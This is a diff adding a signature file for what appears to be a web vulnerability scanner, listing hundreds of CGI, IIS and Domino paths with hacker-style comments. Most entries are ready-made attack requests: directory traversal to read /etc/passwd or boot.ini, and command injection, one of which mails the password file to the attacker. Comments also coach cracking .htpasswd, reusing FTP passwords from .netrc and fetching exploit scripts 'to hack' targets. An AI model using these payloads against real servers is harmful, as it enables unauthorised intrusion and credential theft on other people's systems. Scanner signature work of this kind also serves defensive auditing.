@@ -1,0 +1,326 @@
+/cgi-bin/!Readble cgi-bin directory!
+/cgi-local/!Readable cgi-local directory!
+/cgi-win/!Readable cgi-win directory!
+/cgi-shl/!Readable cgi-shl directory!
+/cgi-dos/!Readable cgi-dos directory!
+/cgi-sys/!Readable cgi-sys directory!
+/cgibin/!Readable cgibin directory!
+/cgi-script/!Readable cgi-script directory!
+/cgiscript/!Readable cgiscript directory!
+/htbin/!Readable htbin directory!
+/test/!Server has test directory!
+/msadc/!Server has msadc directory!
+/scripts/!Server has scripts directory!
+/iishelp/!Server has iishelp directory!
+/scripts/iisadmin!Server has iisadmin directory!
+/britney/!wow cool, a britney fan, check out /britney :)))!
+/log/!Server has log directory!
+/logs/!Server has logs directory!
+/logfiles/!Server has logfiles directory!
+/logging/!Server has logging directory!
+/usage/!Server has usage directory!
+/card/!Server has card directory!
+/creditcard/!Server has creditcard directory!
+/cards/!Server has cards directory!
+/creditcards/!Server has creditcards directory!
+/install/!Server has install directory!
+/ini/!Server has ini directory!
+/database/!Server has database directory!
+/db/!Server has db directory!
+/databases/!Server has databases directory!
+/private/!Server has private directory!
+/secret/!Server has secret directory!
+/secrets/!Server has secrets directory!
+/programs/!Server has programs directory!
+/source/!Server has source diretory!
+/sources/!Server has sources directory!
+/password/!Server has password directory!
+/passwords/!Server has passwords directory!
+/pass/!Server has pass directory!
+/passes/!Server has passes directory!
+/config/!Server has config directory!
+/configure/!Server has configure directory!
+/conf/!Server has conf directory!
+/klant/!Server has klant directory!
+/klanten/!Server has klanten directory!
+/customer/!server has customer directory!
+/customers/!Server has customers directory!
+/gebruikers/!Server has gebruikers directory!
+/user/!Server has user directory!
+/home/!Server has home directory!
+/users/!Server has users directory!
+/setup/!Server has setup directory!
+/snmp/!Server has snmp directory!
+/mrtg/!Server has mrtg directory!
+/stats/!Server has stats directory!
+/stat/!Server has stat directory!
+/statistics/!Server has statistics directory!
+/statistieken/!Server has statistieken directory!
+/statistiek/!Server has statistiek directory!
+/weblog/!Server has weblog directory!
+/weblogs/!Server has weblogs directory!
+/wwwlog/!Server has wwwlog directory!
+/wwwlogs/!Server has wwwlogs directory!
+/wwwwstats/!Server has wwwstats directory!
+/webmin/!Server has webmin directory!
+/tmp/!Server has tmp directory!
+/temp/!Server has temp directory!
+/temporary/!Server has temporary directory!
+/admin/!Server has admin directory!
+/old/!Server has old directory!
+/porno/!Server has porno directory :)))!
+/pr0n/!Server has pr0n directory :)))!
+/pron/!Server has pron directory :)))!
+/xxx/!Server has xxx directory :)))!
+/sex/!Server has sex directory :)))!
+/chicks/!Server has chicks directory :)))!
+/mp3/!Server has mp3 directory!
+/warez/!Server has warez directory!
+/backup/!Server has backup directory!
+/root/!Server has root directory!
+/root.exe!Damn, nimda backdoor!
+/scripts/root.exe!Damn, nimda backdoor!
+/msadc/root.exe!Damn, nimda backdoor!
+/mime/!Attachments from W3Mail web based pop3 client!
+/~root!Root has set his $HOME public, tsk tsk how stupid!
+/cgi-bin/who!Try metacharacters, try %00 to get all users!
+/cgi-bin/who.cgi!Try metacharacters, try %00 to get all users!
+/cgi-bin/environ.cgi!Allows playing with apachelogs!http://www.securiteam.com/exploits/2XUQDQKQ0A.html
+/cgi-bin/news.cgi!News publisher, allows creation of new users!http://www.securiteam.com/exploits/5CP0W0A2AU.html
+/htdig!Possible vulnerabilities, htdig, try htsearch?exclude=%60/etc/passwd%60 & /cgi-bin/htsearch?-c/etc/passwd!http://www.securiteam.com/exploits/5VP0E000EM.html
+/cgi-bin/pfdispaly!try http://victim/cgi-bin/pfdispaly.cgi?'%0A/bin/uname%20-a|'!http://www.insecure.org/sploits/sgi.pfdisplay2.html
+/cgi-bin/formmail.pl!Allows sending mail via that domain!http://www.securityfocus.com/cgi-bin/archive.pl?id=75&mid=211491
+/cgi-bin/wwwboard.pl!Allows wwwboard admin access!http://msgs.securepoint.com/cgi-bin/get/bugtraq/589/2.html
+/cgi-bin/wwwboard/wwwboard.pl!Allows wwwboard admin access!http://msgs.securepoint.com/cgi-bin/get/bugtraq/589/2.html
+/cgi-bin/maillist.pl!Allows execution of arbitrary commands!http://cert.uni-stuttgart.de/archive/bugtraq/2001/04/msg00185.html
+/cgi-bin/edit.pl!Allows Editing!http://cert.uni-stuttgart.de/archive/bugtraq/1998/11/msg00290.html
+/cgi-bin/guestbook.cgi!Allows execution of arbitrary commands!http://secinf.net/info/www/cgi-bugs.htm
+/cgi-bin/view-source!Allows viewing of source (duh) try view-source?../../../../file!http://www.ladysharrow.ndirect.co.uk/library/Exploits/cgi/view-source.txt
+/cgi-bin/bnbform.cgi!Create / append / truncate files owned by the webserver's ID!http://packetstormsecurity.org/advisories/suid/004.txt
+/cgi-bin/test-cgi!Try telnet GET /cgi-bin/test.cgi? * HTTP/1.0!http://www.atstake.com/research/advisories/1996/test-cgi-vulnerability.txt
+/cgi-bin/test.cgi!Hmmm, this could be fun!
+/cgi-bin/nph-test-cgi!Try http://www.somehost.com/cgi-bin/nph-test-cgi?*!
+/cgi-bin/nph-publish!No info yet, seems to be vulnerable!
+/cgi-bin/faxsurcey!Try http://www.somehost.com/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd!http://packetstormsecurity.org/new-exploits/faxsurvey.txt
+/cgi-bin/webdist.cgi!Try http://www.somehost.com/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd!http://www.insecure.org/sploits/irix.webdist-cgi.html
+/cgi-bin/anyform2!No info yet, seems to be vulnerable!
+/cgi-bin/webgais!Allows reading of files!http://www.clip.dia.fi.upm.es/~alopez/bugs/bugtraq2/0055.html
+/cgi-bin/files.pl!Novell Netware problem, seems to be exploitable, no furter info yet!
+/cgi-bin/perlshop.cgi!No info yet, seems to be vulnerable!
+/cgi-bin/jj!Allows execution of arbitrary commands, no further info yet!
+/cgi-bin/classifields.cgi!No info, seems to be vulnerable!
+/cgi-bin/www-sql!No info, seems to be vulnerable!
+/servlet/webacc!Try http://www.somehost.com/servlet?User.html=../../../../../../../../boot.ini%00!
+/cgi-bin/perl.exe!Try /cgi-bin/perl.exe?&-e%20command etc...!http://www.stanford.edu/group/itss-ccs/security/Advisories/96-118.html
+/cgi-bin/textcounter.pl!Allows executing arbitrary commands as httpd UID!http://archives.indenial.com/hypermail/bugtraq/1998/June1998/0130.html
+/.htaccess!Shows access groups, users and location for .htpasswd files!http://www.apache.org
+/.htpasswd!This should not be readable, use it with John to decrypt it, then login!http://www.apache.org
+/cgi-bin/htsearch!Possible vulnerabilities, htdig, try htsearch?exclude=%60/etc/passwd%60 & /cgi-bin/htsearch?-c/etc/passwd!http://www.securiteam.com/exploits/5VP0E000EM.html
+/cgi-bin/htgrep!Allows viewing of files owned by httpd UID, try http://www.somehost.com/cgi-bin/htgrep/file=index.html&hdr=/etc/passwd!http://lwn.net/2000/0824/a/htgrep.php3
+/cgibin/htgrep!Allows viewing of files owned by httpd UID, try http://www.somehost.com/cgibin/htgrep/file=index.html&hdr=/etc/passwd!http://lwn.net/2000/0824/a/htgrep.php3
+/cgibin/htseach!Possible vulnerabilities, htdig, try htsearch?exclude=%60/etc/passwd%60 & /cgibin/htsearch?-c/etc/passwd!http://www.securiteam.com/exploits/5VP0E000EM.html
+/cgi-bin/finger.cgi!Try /cgi-bin/finger.cgi?%00 to show all users!
+/cgi-bin/finger!Try /cgi-bin/finger?%00 to show all users!
+/cgi-bin/php.cgi!Allows viewing of files readable by httpd UID, try cgi-bin/php.cgi?/etc/passwd!http://www.insecure.org/sploits/php.cgi.ncaa.overflow.pattern_restrict.html
+/whois.cgi!Try metacharacters!http://www.securityfocus.com/archive/1/38074
+/cgi-bin/whois.cgi!Try metacharacters!http://www.securityfocus.com/archive/1/38074
+/whois.pl!Try whois.pl?host=;ls etc..!
+/cgi-bin/whois.pl!Try whois.pl?host=;ls etc..!
+/whois_raw.cgi!Try http://www.somehost.com/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd!http://lists.netspace.org/cgi-bin/wa?A2=ind9906a&L=bugtraq&F=&S=&P=409
+/cgi-bin/whois_raw.cgi!Try http://www.somehost.com/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd!http://lists.netspace.org/cgi-bin/wa?A2=ind9906a&L=bugtraq&F=&S=&P=409
+/whois.html!Could lead to whois.cgi problems, check the source!
+/.netrc!This guy is clueless, try the ftp passes (if available) in this file!
+/edit_image.php!Try edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;ls;%20!http://www.securitytracker.com/alerts/2001/Sep/1002334.html
+/info2www!Allows emailing files readable by UID httpd!http://www.securityfocus.com/archive/1/8658
+/cgi-bin/info2www!Allows emailing files readable by UID httpd!http://www.securityfocus.com/archive/1/8658
+/cgi-bin/phf!LOL, possible phf bug, Try phf?Qalias=%0als etc..!No URL here, this is too fscking obvious!
+/cgi-bin/htmlscript!Try http://www.somehost.com/cgi-bin/htmlscript?../../../../../etc/passwd!http://www.insecure.org/sploits/htmlscript.fileaccess.html
+/cgi-bin/who!Try http://www.somehost.com/cgi-bin/who?%00 and metacharcters etc...!
+/cgi-bin/who.cgi!Try http://www.somehost.com/cgi-bin/who.cgi?%00 and metacharcters etc...!
+/cgi-bin/finger.pl!Try http://www.somehost.com/cgi-bin/finger.pl?%00 and metacharcters etc...!
+/cgi-bin/websendmail!Try http://www.somehost.com/cgi-bin/websendmail?receiver=;mail+user\@user.net!
+/cgi-bin/infosrch.cgi!http://www.somehost.com/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id!
+/scripts/CGImail.exe!Allows attachment of any file that can be read by the UID of the webserver!http://arbon.elxsi.de/txt/http-bugs-109.txt
+/cgi-bin/wguest.exe!Try http://www.somehost.com/cgi-bin/wguest.exe?template=c:\boot.ini!http://arbon.elxsi.de/txt/http-bugs-109.txt
+/cgi-bin/ssi!Try http://www.somehost.com/cgi-bin/ssi/../../../../../../../../../etc/passwd!http://arbon.elxsi.de/txt/http-bugs-109.txt
+/cgi-bin/shop.pl!Try http://www.somehost.com/cgi-local/shop.pl/page=../../../../../../../../../../../../../../etc/passwd!
+/cgi-local/shop.pl!Try http://www.somehost.com/cgi-bin/shop.pl/page=../../../../../../../../../../../../../../etc/passwd!
+/cgi-bin/zml.cgi!Try http://www.somehost.com/cgi-bin/zml.cgi?file=../../../../../../../../../etc/passwd%00!http://packetstorm.widexs.nl/0201-exploits/zml.cgi.txt
+/cgi-bin/cgiforum.pl!Try http://www.somehost.com/cgi-bin/cgiforum.pl?thesection=../../../../../../etc/passwd%00!http://packetstorm.widexs.nl/0011-exploits/cgiforum-1.0.txt
+/cgi-bin/ustorkeeper.pl!Try http://www.somehost.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../etc/hosts!http://www.securiteam.com/securitynews/5MP051P4AQ.html
+/cgi-bin/anacondaclip.pl!Try http://www.somehost.com/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passwd!http://www.securiteam.com/unixfocus/5TP0B154VA.html
+/cgi-bin/talkback.cgi!Try http://www.somehost.com/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1!http://www.securityfocus.com/archive/1/175090
+/php/php.exe!Try http://www.somehost.com/php/php.exe?c:\boot.ini etc...!http://packetstorm.widexs.nl/0201-exploits/nt.php.htm
+/cgi-bin/ttawebtop.cgi!Try cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd!http://www.securiteam.com/unixfocus/5XP0O1P4LA.html
+/cgi-bin/udirectory.pl!Try http://www.somehost.com/cgi-bin/udirectory.pl?MAIN_FIELD=blah&command=add_new_listing&category_file=/../../../../../../../bin/cat+/etc/passwd|!http://www.securityfocus.com/archive/1/191829
+/cgi-bin/powerup/r.cgi!Try http://www.somehost.com/cgi-bin/powerup/r.cgi?FILE=../../../../../etc/passwd!http://www.securiteam.com/unixfocus/5PP062K5FO.html
+/cgi-bin/eshop.pl!Try http://www.somehost.com/cgi-bin/eshop.pl?seite=;ls|!http://www.securityfocus.com/archive/1/214456
+/scripts/shopplus.cgi!Try http://www.somehost.com/scripts/shopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20/etc/passwd|!http://www.securityfocus.com/archive/1/212155
+/cgi-bin/shopplus.cgi!Try http://www.somehost.com/cgi-bin/shopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20/etc/passwd|!http://www.securityfocus.com/archive/1/212155
+/basilix.php3!Try http://www.somehost.com/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=blah&password=blah!http://www.securityfocus.com/archive/1/195446
+/global.asa+.htr!Try http://www.somehost.com/global.asa+.htr!
+/global.asa%3f.htr!Try http://www.somehost.com/global.asa%3f.htr!
+/ws_ftp.ini!ws_ftp.ini could contain passwords!
+/WS_FTP.INI!WS_FTP.INI could contain passwords!
+/passwd!WTF?!
+/password!WTF?!
+/passwd.txt!WTF?!
+/password.txt!WTF?!
+/passwd.old!WTF?!
+/passwd.backup!WTF?!
+/passwd.bak!WTF?!
+/tree.dat!CuteFTP datafile, contains easy to decrypt passwords!
+/_vti_pvt/service.pwd!Bah, frontpage!
+/_vti_pvt/users.pwd!Bah, frontpage!
+/_vti_pvt/author.pwd!Bah, frontpage!
+/_vtp_pvt/administrators.pwd!Bah, frontpage!
+/shadow!WTF a shadow file ?!
+/shadow.txt!WTF a shadow.txt file ?!
+/admin.html!!
+/cgi-bin/admin.pl!This can be interesting...!
+/cgi-bin/man-cgi!Try http://www.somehost.com/cgi-bin/man-cgi?%20/etc/hosts%20!http://packetstorm.widexs.nl/0102-exploits/man-cgi.txt
+/cgi-bin/webspircs.cgi!Contains vulnerabilities, didn't find docu!
+/cgi-bin/store.cgi!Try http://www.somehost.com/cgi-bin/store.cgi?StartID=../etc/hosts%00.html!http://www.securityfocus.com/archive/1/163523!
+/cgi-bin/webcart/webcart.cgi!Try http://www.somehost.com/cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;ls|&CODE=PHOLD!
+/cgi-bin/webcart.cgi!!Try http://www.somehost.com/cgi-bin/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;ls|&CODE=PHOLD!
+/cgi-bin/faq/faqmanager.cgi!Try http://www.somehost.com/cgi-bin/faq/faqmanager.cgi?toc=/etc/passwd%00!
+/cgi-bin/faqmanager.cgi!Try http://www.somehost.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00!
+/hc/stats/statsbrowse.asp!Hosting controller, try http://www.somehost.com/hc/stats/statsbrowse.asp?filepath=c:\&Opt=3!
+/hc/serv_u/servubrowse.asp!Hosting controller, try http://www.somehost.com/hc/serv_u/servubrowse.asp?filepath=c:\&Opt=3!
+/hc/adminsettings/browsedisk.asp!Hosting controller, try http:///www.somehost.com/hc/adminsettings/browsedisk.asp?filepath=c:\&Opt=3!
+/hc/adminsettings/browsewebalizerexe.asp!Hosting controller, try http://www.somehost.com/hc/adminsettings/browsewebalizerexe.asp?filepath=c:\&Opt=3!
+/hc/SQLServ/sqlbrowse.asp!Hosting controller, try http://www.somehost.com/hc/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3!
+/php/php.exe!Try http://www.somehost.com/php/php.exe?c:\boot.ini!
+/cgi-bin/test.bat!Try http://www.somehost.com/cgi-bin/test.bat?&dir!http://www.stanford.edu/group/itss-ccs/security/Advisories/96-118.html!
+/publisher/!Netscape publisher!
+/names.nsf/$users!Domino bug, try http://www.somehost.com/names.nsf/$users!
+/names.nsf/$defaultnav!Domino bug, try http://www.somehost.com/names.nsf/$defaulnav!
+/msadc/msadcs.dll!Use http://packetstormsecurity.org/9911-exploits/msadc2.pl to hack it!http://www.wiretrip.net/rfp/p/doc.asp?id=1&iface=2
+/scripts/tools/newdsn.exe!NewDSN *g*!Use http://packetstormsecurity.org/0004-exploits/dsnhack.pl to hack it!http://xforce.iss.net/static/1530.php
+/scripts/ncx99.exe!Hmmm not good, trojan, opens port 99 to command shell!
+/scripts/ncx.exe!Hmmm not good, trojan, opens port 80 to command shell!
+/msadc/ncx99.exe!Hmmm not good, trojan, opens port 99 to command shell!
+/msadc/ncx.exe!Hmmm not good, trojan, opens port 80 to command shell!
+/exair/howitworks/codebrws.asp!Geezus, Try http://www.somehost.com/iisamples/exair/howitworks/codebrws.asp?source=/../../../../../boot.ini!http://p.ulh.as/xploitsdb/NT/iis38.html
+/msadc/samples/selector/showcode.asp!Geezus, try http://www.somehost.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../../boot.ini!http://p.ulh.as/xploitsdb/NT/iis38.html
+/cfdocs/expeval/openfile.cfm!Possible ColdFusion bug!
+/cgi-bin/hello.bat!HUH, Sambar server? Try http://www.somehost.com/cgi-bin/hello.bat?&dir+c:\!http://packetstorm.decepticons.org/0002-exploits/sambar.bat.txt
+/cgi-bin/echo.bat!HUH, Sambar server? Try http://www.somehost.com/cgi-bin/echo.bat?&dir+c:\!http://packetstorm.decepticons.org/0002-exploits/sambar.bat.txt
+/iissamples/exair/search/advsearch.asp!Exair sample DOS!http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0449
+/carbo.dll!Try http://www.somehost.com/carbo.dll?icatcommand=..\..\..\..\..\boot.ini&catalogname=catalog!http://www.securityfocus.com/bid/2126
+/cgi-win/uploader.exe!Possible Website Pro bug, try uploading files!http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0177CVE-1999-0177
+/search97.vts!!http://www.h-d-c.org/download/source/cgi.txt
+/cgi-bin/sendtemp.pl!Hmmm, try http://www.somehost.com/cgi-bin/sendtemp.pl?templ=../../../../../../etc/passwd!http://www.h-d-c.org/download/source/cgi.txt
+/cgi-bin/pals-cgi!Try http://www.somehost.com/pals-cgi?palsAction=restart&documentName=../../../../../../../etc/passwd!http://www.h-d-c.org/download/source/cgi.txt
+/cgi-bin/ad.cgi!Possible vulnerability!http://www.h-d-c.org/download/source/cgi.txt
+/cgi-bin/apexec.pl!Try http://www.somehost.com/cgi-bin/apexec.pl? etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/!http://www.securiteam.com/unixfocus/6X00P0A00C.html
+/cgi-bin/auktion.pl!Try http://www.somehost.com/cgi-bin/auktion.pl?menue=../../../../../../../../etc/passwd!http://www.securityfocus.com/archive/1/162289
+/cgi-bin/bbs_forum.cgi!Try http://www.somehost.com/cgi-bin/bbs_forum.cgi?forum=<valid forum name>&read=../bbs_forum.cgi!http://www.securiteam.com/exploits/5GP110A35G.html
+/cgi-bin/campas!Try http://www.www.somehost.com/cgi-bin/campas?%0acat%0a/etc/passwd%0a!http://xforce.iss.net/static/298.php
+/cgi-bin/commerce.cgi!Try http://www.somehost.com/cgi/commerce.cgi?page=../../../../etc/hosts%00index.html!http://www.securiteam.com/securitynews/5ZP0H1F3FS.html
+/cgi-bin/convert.bas!Novell bug, try http://www.somehost.com/scripts/convert.bas?../../anything/you/want/to/see!http://www.securityfocus.com/cgi-bin/vulns-item.pl?section=exploit&id=2025
+/dcforum/dcforum.cgi!Try http://www.somehost.com/dcforum/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00!http://www.securiteam.com/securitynews/5UP001536W.html
+/cgi-bin/excite!Try http://www.somehost.com/cgi-bin/excite;IFS="$";/bin/cat /etc/passwd|mail your_email_here!
+/cgi-bin/gbook/gbook.cgi!Try http://www.somehost.com/cgi-bin/gbook/gbook.cgi?_MAILTO=oops;cat%20/etc/passwd|mail%20your@emailadres.com&_POSTIT=yes&_NEWONTOP=yes&_SHOWEMAIL=yes&_SHOWURL=yes&_SHOWCOMMENT=yes&_SHOWFROM=no&_NAME=hehe&_EMAIL=fwe@yaho.com&_URL=http://www.bla.org&_COMMENT=fwe&_FROM=few"!http://www.securityfocus.com/archive/1/144497
+/cgi-bin/gbook.cgi!Try http://www.somehost.com/cgi-bin/gbook.cgi?_MAILTO=oops;cat%20/etc/passwd|mail%20your@emailadres.com&_POSTIT=yes&_NEWONTOP=yes&_SHOWEMAIL=yes&_SHOWURL=yes&_SHOWCOMMENT=yes&_SHOWFROM=no&_NAME=hehe&_EMAIL=fwe@yaho.com&_URL=http://www.bla.org&_COMMENT=fwe&_FROM=few"!http://www.securityfocus.com/archive/1/144497
+/cgi-bin/search.cgi!!Too much vulnerabilities, search google
+/cgi-bin/search/search.cgi!!Too much vulnerabilities, search google
+/cgi-bin/quikstore.cgi!Try http://www.somehost.com/cgi-bin/quikstore.cgi?page=../../../../../../../etc/passwd%00index.html!
+/sawmill!Try http://www.somehost.com/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3!
+/cgi-bin/sawmill!Try http://wwww.somehost.com/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1!
+/cgi-bin/view-source!Try http://www.somehost.com/cgi-bin/view-source?../../../../../../../etc/passwd!
+/cgi-bin/w3-msql/!sigh...!
+/way-board/way-board.cgi!Try http://www.somehost.com/way-board/way-board.cgi?db=../../../../../../../etc/passwd%00!http://www.securityfocus.com/archive/1/162267
+/cgi-bin/webspirs.cgi!Try http://www.somehost.com/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../etc/passwd!http://www.securiteam.com/exploits/5NP0Q203FI.html
+/cgi-bin/Web_store/web_store.cgi!Try http://www.somehost.com/cgi-bin/Web_store/web_store.cgi?page=../../../../. ./../../../etc/passwd%00.html!http://www.securiteam.com/exploits/6W00L0A03C.html
+/cgi-bin/webplus!Try http://www.somehost.com/cgi-bin/webplus?script=/../../../../etc/passwd!
+/cgi-bin/whois_raw.cgi!Try http://www.somehost.com/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd!
+/cgi-bin/wrap!Try http://www.somehost.com/cgi-bin/wrap?/../../../../../etc!
+/cgi-bin/YaBB.pl!Try http://www.somehost.com/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../etc/passwd%00!http://www.synnergy.net/downloads/advisories/SLA-2000-13.yabb.txt
+/scripts/tools/getdrvs.exe!Gives possibility to create files!
+/users.txt!Server has a users.txt file!
+/log.ntf+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.nsf/!Domino bug, try http://www.somehost.com/log.ntf+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.nsf/!
+/cgi-bin/14all.cgi!Try http://www.somehost.com/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd!http://www.securityfocus.com/bid/4017
+/cgi-bin/14all-1.1.cgi!Try  http://www.somehost.com/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd!http://www.securityfocus.com/bid/4017
+/cgi-bin/traffic.cgi!Try  http://www.somehost.com/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd!http://www.securityfocus.com/bid/4017
+/cgi-bin/mrtg.cgi!Try http://www.somehost.com/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd!http://www.securityfocus.com/bid/4017
+/cgi-bin/fom/fom.cgi!FAQ O Matic vulnerability!More information follows
+/exchange/lib/logon.inc!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/AMPROPS.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/ATTACH.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/DELETE.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/GETREND.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/GETWHEN.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/JSATTACH.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/JSROOT.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/JSUTIL.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/LANG.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/PAGEUTIL.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/PUBFLD.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/RENDER.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/SESSION.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/exchange/lib/STORE.INC!Outlook Webaccess include files vulnerability!http://packetstormsecurity.nl/advisories/misc/owa-advisory-en.txt
+/cgi-bin/YaBB.cgi!Cross Site Scripting bugs!http://online.securityfocus.com/archive/1/278159
+/cgi-bin/cgitelnet.pl!Shows DOCUMENT_ROOT!http://ws.obit.nl/exploits/cgitelnet.pl.html
+/cgi-bin/traceroute.pl!Penguin Traceroute, they forgot to comment the backtics out!http://ws.obit.nl/exploits/traceroute.html
+/database/metacart.mdb!Shopping cart private info!
+/metacart/database/metacart.mdb!Shopping cart private info!
+/webMathematica/MSP!Directory traversal, try http://www.domain.com/webMathematica/MSP?MSPStoreID=../../../../../etc/passwd&MSPStoreType=image/gif!http://online.securityfocus.com/archive/1/277253
+/cgi-bin/auction/auction.cgi!Cross Site Scripting Bug!http://online.securityfocus.com/archive/1/277049
+/phpclassifieds/latestwap.php!Cross Site Scripting Bug!http://online.securityfocus.com/archive/1/277049
+/cgi-bin/CSNews.cgi!Multiple Vulnerabilities!http://online.securityfocus.com/archive/1/276411
+/cgi-bin/af.cgi!Try http://www.somehost.com/cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd!http://online.securityfocus.com/archive/1/276248
+/cgi-bin/CSPassword.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/274727
+/cgi-bin/csBanner.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/csCreatePro.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSDownload.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/csFAQ.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSFiler.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSFileshare.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSGrid.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSIncludes.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSMailto.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSNews.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/csNewsPro.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSPassword.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSRandomText.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/CSUpload.cgi!Multiple vulnerabilities!http://online.securityfocus.com/archive/1/273061
+/cgi-bin/viewcvs.cgi!Cross Site Scripting bug!http://online.securityfocus.com/archive/1/273102
+/cgi-bin/netpad.cgi!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/272348
+/b2-include/b2edit.showposts.php!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/271105
+/b2/b2-include/b2edit.showposts.php!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/271105
+/globals.php3!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/277987
+/scripts/Carello/Carello.dll!Read files as UID of the webserver!http://www.westpoint.ltd.uk/advisories/wp-02-0012.txt
+/robots.txt!!
+/ifx/!Informix, enables file reading, try http://www.somehost.com/ifx/?LO=../../../../file!
+/cgi-bin/alibaba.pl!Can be used to execute commands!
+/pbserver/pbserver.dll!Potential bufferoverflow!http://www.microsoft.com/technet/security/bulletin/ms00-094.asp
+/.cobalt/siteUserMod/siteUserMod.cgi!Potentially allows any user to change Administrator password!
+/cgi-bin-sdb/!Suse, allows reading of CGI sources!
+/exec/show/config/cr!Cisco configuration disclosure!
+/tsweb/!Allows remote MSRDP service!
+/cgi-bin/sendmform.cgi!Allows directory traversal!http://online.securityfocus.com/archive/82/162345
+/adsamples/!Server has adsamples directory!
+/cgi-bin/imagemap.exe!Bufferoverflow!http://www.securiteam.com/windowsntfocus/5XQ0C000HK.html
+/calendar.php!Possible command execution via a bufferoverflow!http://www.securiteam.com/exploits/5QP0P158AC.html
